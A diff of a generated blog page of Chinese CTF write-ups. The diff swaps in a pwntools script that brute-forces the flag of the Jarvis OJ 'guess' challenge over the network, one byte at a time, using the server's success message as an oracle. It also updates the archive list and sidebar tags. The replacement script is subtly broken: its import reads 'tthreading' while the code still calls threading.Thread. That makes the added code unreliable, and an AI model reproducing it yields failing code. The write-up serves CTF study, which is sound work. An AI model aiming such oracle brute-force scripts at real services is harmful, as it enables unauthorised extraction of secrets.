@@ -871,7 +871,7 @@ height:30vh;
 <p>将恒为true</p>
 <p>但是即使验证正确仍不能得到flag,这时就可以想逐位爆破了,根据提示判断爆破是否成功</p>
 <hr>
-<h3 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">"debug"</span>, arch = <span class="string">"amd64"</span>,os = <span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">hexs = string.digits + string.ascii_lowercase[:<span class="number">6</span>]</span><br><span class="line">exe = <span class="string">'guess'</span></span><br><span class="line">lib = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'pwn.jarvisoj.com'</span></span><br><span class="line">port = <span class="number">9878</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line"><span class="comment">#libc = ELF(lib)</span></span><br><span class="line"></span><br><span class="line">flag = [[]]*<span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb</span><span class="params">(script = <span class="string">''</span>)</span>:</span></span><br><span class="line">	attach(io,gdbscript = script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="comment">#io = process(elf, env=&#123;"LD_PRELOAD":libc.path&#125;)</span></span><br><span class="line">	io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">	flags = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> r <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">		flags += <span class="string">'0'</span></span><br><span class="line">		flags += chr(<span class="number">0x40</span>+<span class="number">0x80</span>+r)</span><br><span class="line"></span><br><span class="line">	io.recvuntil(<span class="string">'guess&gt;'</span>)</span><br><span class="line">	<span class="keyword">for</span> r <span class="keyword">in</span> range(<span class="number">0x80</span>):</span><br><span class="line">		value0 = hexs[r//<span class="number">16</span>]</span><br><span class="line">		value1 = hexs[r%<span class="number">16</span>]</span><br><span class="line">		payload = flags[:i*<span class="number">2</span>] + value0 + value1 + flags[i*<span class="number">2</span>+<span class="number">2</span>:]</span><br><span class="line">		io.sendline(payload)</span><br><span class="line"></span><br><span class="line">		tips = io.recvuntil(<span class="string">'guess&gt;'</span>)</span><br><span class="line">		<span class="keyword">if</span> tips[:<span class="number">7</span>] == <span class="string">' Yaaaay'</span>:</span><br><span class="line">			flag[i] = chr(int(value0, <span class="number">16</span>)*<span class="number">16</span> + int(value1, <span class="number">16</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">t=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    t[i] = threading.Thread(target=pwn,args=(i,))</span><br><span class="line">    t[i].start()</span><br><span class="line">    t[i].join()</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> tthreading</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">"debug"</span>, arch = <span class="string">"amd64"</span>,os = <span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">hexs = string.digits + string.ascii_lowercase[:<span class="number">6</span>]</span><br><span class="line">exe = <span class="string">'guess'</span></span><br><span class="line">lib = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'pwn.jarvisoj.com'</span></span><br><span class="line">port = <span class="number">9878</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line"><span class="comment">#libc = ELF(lib)</span></span><br><span class="line"></span><br><span class="line">flag = [[]]*<span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb</span><span class="params">(script = <span class="string">''</span>)</span>:</span></span><br><span class="line">	attach(io,gdbscript = script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="comment">#io = process(elf, env=&#123;"LD_PRELOAD":libc.path&#125;)</span></span><br><span class="line">	io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">	flags = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> r <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">		flags += <span class="string">'0'</span></span><br><span class="line">		flags += chr(<span class="number">0x40</span>+<span class="number">0x80</span>+r)</span><br><span class="line"></span><br><span class="line">	io.recvuntil(<span class="string">'guess&gt;'</span>)</span><br><span class="line">	<span class="keyword">for</span> r <span class="keyword">in</span> range(<span class="number">0x80</span>):</span><br><span class="line">		value0 = hexs[r//<span class="number">16</span>]</span><br><span class="line">		value1 = hexs[r%<span class="number">16</span>]</span><br><span class="line">		payload = flags[:i*<span class="number">2</span>] + value0 + value1 + flags[i*<span class="number">2</span>+<span class="number">2</span>:]</span><br><span class="line">		io.sendline(payload)</span><br><span class="line"></span><br><span class="line">		tips = io.recvuntil(<span class="string">'guess&gt;'</span>)</span><br><span class="line">		<span class="keyword">if</span> tips[:<span class="number">7</span>] == <span class="string">' Yaaaay'</span>:</span><br><span class="line">			flag[i] = chr(int(value0, <span class="number">16</span>)*<span class="number">16</span> + int(value1, <span class="number">16</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">t=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    t[i] = threading.Thread(target=pwn,args=(i,))</span><br><span class="line">    t[i].start()</span><br><span class="line">    t[i].join()</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="相关资料-12"><a href="#相关资料-12" class="headerlink" title="相关资料"></a>相关资料</h3><p><a href="https://veritas501.space/2017/03/10/JarvisOJ_WP/" title="PWN - [XMAN]level6" target="_blank" rel="noopener">0</a>:     “Jarvis OJ平台 WP”</p>
@@ -1779,9 +1779,26 @@ top:30vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 46
+        Total : 47
         </div>
         <!-- search  -->
         
@@ -1798,6 +1815,11 @@ top:30vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2019/08/26/WP_2019OGeek/" >[WriteUp]2019OGeek</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2053,9 +2075,9 @@ top:30vh;
     
         <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="Canary"><span class="iconfont-archer">&#xe606;</span>Canary</span>
-    
         <span class="sidebar-tag-name" data-tags="Heap"><span class="iconfont-archer">&#xe606;</span>Heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="Canary"><span class="iconfont-archer">&#xe606;</span>Canary</span>
     
         <span class="sidebar-tag-name" data-tags="IDA"><span class="iconfont-archer">&#xe606;</span>IDA</span>
     
@@ -2065,9 +2087,9 @@ top:30vh;
     
         <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
     
-        <span class="sidebar-tag-name" data-tags="PDF"><span class="iconfont-archer">&#xe606;</span>PDF</span>
-    
         <span class="sidebar-tag-name" data-tags="Tcache"><span class="iconfont-archer">&#xe606;</span>Tcache</span>
+    
+        <span class="sidebar-tag-name" data-tags="PDF"><span class="iconfont-archer">&#xe606;</span>PDF</span>
     
         <span class="sidebar-tag-name" data-tags="Code"><span class="iconfont-archer">&#xe606;</span>Code</span>
     
@@ -2091,11 +2113,11 @@ top:30vh;
     
         <span class="sidebar-tag-name" data-tags="IO_FILE"><span class="iconfont-archer">&#xe606;</span>IO_FILE</span>
     
+        <span class="sidebar-tag-name" data-tags="StackOverflow"><span class="iconfont-archer">&#xe606;</span>StackOverflow</span>
+    
         <span class="sidebar-tag-name" data-tags="Arm"><span class="iconfont-archer">&#xe606;</span>Arm</span>
     
         <span class="sidebar-tag-name" data-tags="Cpp"><span class="iconfont-archer">&#xe606;</span>Cpp</span>
-    
-        <span class="sidebar-tag-name" data-tags="StackOverflow"><span class="iconfont-archer">&#xe606;</span>StackOverflow</span>
     
         <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
     
@@ -2111,6 +2133,12 @@ top:30vh;
     
         <span class="sidebar-tag-name" data-tags="ShellCode"><span class="iconfont-archer">&#xe606;</span>ShellCode</span>
     
+        <span class="sidebar-tag-name" data-tags="FastbinAttack"><span class="iconfont-archer">&#xe606;</span>FastbinAttack</span>
+    
+        <span class="sidebar-tag-name" data-tags="HeapOverflow"><span class="iconfont-archer">&#xe606;</span>HeapOverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="StackOvrtflow"><span class="iconfont-archer">&#xe606;</span>StackOvrtflow</span>
+    
         <span class="sidebar-tag-name" data-tags="wargame"><span class="iconfont-archer">&#xe606;</span>wargame</span>
     
         <span class="sidebar-tag-name" data-tags="SystemCall"><span class="iconfont-archer">&#xe606;</span>SystemCall</span>
@@ -2120,8 +2148,6 @@ top:30vh;
         <span class="sidebar-tag-name" data-tags="Fastbin"><span class="iconfont-archer">&#xe606;</span>Fastbin</span>
     
         <span class="sidebar-tag-name" data-tags="FormatString"><span class="iconfont-archer">&#xe606;</span>FormatString</span>
-    
-        <span class="sidebar-tag-name" data-tags="StackOvrtflow"><span class="iconfont-archer">&#xe606;</span>StackOvrtflow</span>
     
         <span class="sidebar-tag-name" data-tags="OJ"><span class="iconfont-archer">&#xe606;</span>OJ</span>
     
